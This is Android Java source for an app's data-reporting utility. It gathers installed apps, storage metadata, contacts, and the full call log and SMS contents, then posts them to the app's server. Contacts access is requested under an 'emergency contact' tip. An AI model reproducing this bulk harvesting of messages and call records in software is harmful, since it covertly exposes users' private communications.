package com.bigshark.android.services;

import android.Manifest;
import android.support.annotation.NonNull;

import com.bigshark.android.R;
import com.bigshark.android.core.display.IDisplay;
import com.bigshark.android.core.permission.PermissionListener;
import com.bigshark.android.core.permission.PermissionTipInfo;
import com.bigshark.android.core.permission.PermissionsUtil;
import com.bigshark.android.core.utils.ConvertUtils;
import com.bigshark.android.data.CallLogInfoItemData;
import com.bigshark.android.data.SmsItemData;
import com.bigshark.android.events.ServiceClEventModel;
import com.bigshark.android.events.ServiceSmsEventModel;
import com.bigshark.android.http.HttpConfig;
import com.bigshark.android.http.model.param.UpdateDataType;
import com.bigshark.android.http.xutils.CommonRequestParams;
import com.bigshark.android.http.xutils.CommonResponseCallback;
import com.bigshark.android.http.xutils.HttpSender;
import com.bigshark.android.mmkv.MmkvGroup;
import com.bigshark.android.utils.StringConstant;
import com.google.gson.Gson;
import com.socks.library.KLog;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import de.greenrobot.event.EventBus;

/**
 * Created by hpzhan on 2019/8/4.
 * 上传数据
 */
public class ServiceUtils {

    public static void reportServiceDatas(IDisplay display, boolean isCheckPermission) {
        INSTANCE.attach();

        ApplicationsIntentService.report(display);
        if (isCheckPermission) {
            reportMetadatas(display);
            reportContacts(display);
        } else {
            MetadatasIntentService.report(display);
            ContactsIntentService.report(display);
        }
        UploadService2Utils.reportServiceDatas(
                display,
                isCheckPermission,
                MmkvGroup.loginInfo().getUserName(),
                MmkvGroup.data().getCallLogUploadTime(),
                MmkvGroup.data().getSmsUploadTime()
        );
    }

    private static void reportMetadatas(final IDisplay display) {
        PermissionTipInfo tip = PermissionTipInfo.getTip("Storage");
        PermissionsUtil.requestPermission(display.act(), new PermissionListener() {
            @Override
            public void permissionGranted(@NonNull String[] permission) {
                MetadatasIntentService.report(display);
            }

            @Override
            public void permissionDenied(@NonNull String[] permission) {
                display.showToast("Please enable Storage permissions");
            }
        }, tip, Manifest.permission.READ_EXTERNAL_STORAGE);
    }

    private static void reportContacts(final IDisplay display) {
        PermissionTipInfo tip = PermissionTipInfo.getTip(display.getString(R.string.emerygency_contact_tip));
        PermissionsUtil.requestPermission(display.act(), new PermissionListener() {
            @Override
            public void permissionGranted(@NonNull String[] permission) {
                ContactsIntentService.report(display);
            }

            @Override
            public void permissionDenied(@NonNull String[] permission) {
                display.showToast(R.string.emerygency_please_open_contact);
            }
        }, tip, Manifest.permission.READ_CONTACTS);
    }


    public static final Reporter INSTANCE = new Reporter();

    public static final class Reporter {
        private Reporter() {
            EventBus.getDefault().register(this);
        }

        public void attach() {
        }

        public void onEvent(ServiceClEventModel event) {
            if (event.getCallLogInfos() != null) {
                uploadc(event.getCallLogInfos());
            }
        }

        private void uploadc(List<CallLogInfoItemData> callLogInfos) {
//            UpdateDataType callBean = new UpdateDataType();
//            callBean.bindViewData(ConvertUtils.toString(callLogInfos));
//            callBean.setType(UpdateDataType.TYPE_CALL);
//            NetWorkPathData.uploadContents(callBean, new NetWorkWrapperCallback<String>() {
//                @Override
//                public void onSuccess(int code, String message, String data) {
//                    MmkvGroup.data().uploadCallLogUploadTime();
//                }
//
//                @Override
//                public void onFailed(NetWorkResponseErrorEntity error) {
//                }
//            }, false);

            HttpSender.post(new CommonResponseCallback<String>(null) {

                @Override
                public CommonRequestParams createRequestParams() {
                    String uploadInfoUrl = HttpConfig.getRealUrl(StringConstant.HTTP_DATA_UPDATE_INFO);
                    CommonRequestParams requestParams = new CommonRequestParams(uploadInfoUrl);
                    String data = ConvertUtils.toString(callLogInfos);
                    requestParams.addBodyParameter("data", data);
                    requestParams.addBodyParameter("type", UpdateDataType.TYPE_CALL);
                    return requestParams;
                }

                @Override
                public void handleUi(boolean isStart) {
                }

                @Override
                public void handleSuccess(String resultData, int resultCode, String resultMessage) {
                    MmkvGroup.data().uploadCallLogUploadTime();
                }

                @Override
                public void handleFailed(int resultCode, String resultMessage) {

                }

                @Override
                public void onCancelled(CancelledException cex) {
                    KLog.d(cex);
                }
            });
        }


        public void onEvent(ServiceSmsEventModel event) {
            if (event.getSmsInfos() != null) {
                //uploadSmsUploadTime
                HttpSender.post(new CommonResponseCallback<String>(null) {

                    @Override
                    public CommonRequestParams createRequestParams() {
                        String uploadInfoUrl = HttpConfig.getRealUrl(StringConstant.HTTP_DATA_UPDATE_INFO);
                        CommonRequestParams requestParams = new CommonRequestParams(uploadInfoUrl);
                        String data = ConvertUtils.toString(event.getSmsInfos());
                        requestParams.addBodyParameter("data", data);
                        requestParams.addBodyParameter("type", UpdateDataType.TYPE_SMS);
                        return requestParams;
                    }

                    @Override
                    public void handleUi(boolean isStart) {
                    }

                    @Override
                    public void handleSuccess(String resultData, int resultCode, String resultMessage) {
                        MmkvGroup.data().uploadSmsUploadTime();
                    }

                    @Override
                    public void handleFailed(int resultCode, String resultMessage) {

                    }

                    @Override
                    public void onCancelled(CancelledException cex) {
                        KLog.d(cex);
                    }
                });
            }
        }

        /**
         * 将短信内容中的特殊字符通过fastjson强转为Unicode，使得后台能够正常解析
         */
        private String getUploadSmsInfoContent(List<SmsItemData> smsInfos) {
            String smsInfoContent = ConvertUtils.toString(smsInfos);
            List<SmsItemData> uploadSmsInfos = ConvertUtils.toList(smsInfoContent, SmsItemData.class);
            KLog.i("sms size:" + smsInfos.size() + ", real sms size:" + uploadSmsInfos.size());
            return new Gson().toJson(uploadSmsInfos);
        }
    }


    public static List<String> getMustPermissions() {
        List<String> all = new ArrayList<>(16);
        all.addAll(Arrays.asList(
                Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.CAMERA,
                Manifest.permission.READ_CONTACTS
//                Manifest.permission.READ_SMS,
//                Manifest.permission.READ_CALL_LOG,
        ));
        all.addAll(UploadService2Utils.getMustPermissions());
        return all;
    }

    public static String[] getMustPermissionTips() {
        List<String> all = new ArrayList<>(8);
        all.addAll(Arrays.asList(
                "Storage", "Location", "Phone", "Camera", "Contacts"
        ));
        all.addAll(UploadService2Utils.getMustPermissionTips());
        return all.toArray(new String[]{});
    }

    public static String getMustPermissionDeniedTip() {
        return UploadService2Utils.getMustPermissionDeniedTip();
    }
}
